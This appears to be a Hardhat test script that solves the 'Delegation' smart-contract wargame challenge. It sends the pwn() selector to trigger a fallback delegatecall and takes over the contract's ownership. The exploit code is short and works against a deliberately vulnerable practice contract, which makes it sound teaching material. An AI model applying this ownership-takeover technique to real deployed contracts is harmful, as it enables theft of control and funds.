const { ethers } = require("hardhat")
const { assert } = require("chai")
const { Interface } = require("ethers/lib/utils")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xc98C248364012a749AA36751B9e6B77c84fBC70C"

describe("06 Delegation", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Delegation",
            CONTRACT_ADDRESS,
            player
        )
        const ownerBefore = await challengeContract.owner()
        assert.notEqual(ownerBefore.toString(), player.address.toString())
    })

    it("Execution", async function () {
        const abi = ["function pwn() public"]
        const interface = new Interface(abi)
        const selector = interface.getSighash("pwn()")
        const txResponse = await player.sendTransaction({
            to: challengeContract.address,
            data: selector,
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
    })

    after(async function () {
        const ownerAfter = await challengeContract.owner()
        assert.equal(ownerAfter.toString(), player.address.toString())
    })
})
